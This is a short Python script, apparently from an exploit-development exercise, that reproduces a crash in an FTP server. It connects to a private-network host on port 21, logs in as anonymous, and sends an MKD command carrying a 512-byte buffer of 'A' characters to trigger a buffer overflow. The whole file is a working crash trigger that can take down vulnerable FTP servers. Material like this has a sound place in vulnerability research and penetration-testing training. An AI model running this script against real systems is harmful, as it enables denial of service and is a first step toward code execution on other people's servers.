#replicate crash

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A"*512 

s.connect(('172.16.0.24',21))
s.recv(1024)

s.send('USER anonymous\r\n')
s.recv(1024)

s.send('PASS anonymous\r\n')
s.recv(1024)

s.send('MKD ' +buffer+'\r\n')
s.recv(1024)

s.close()
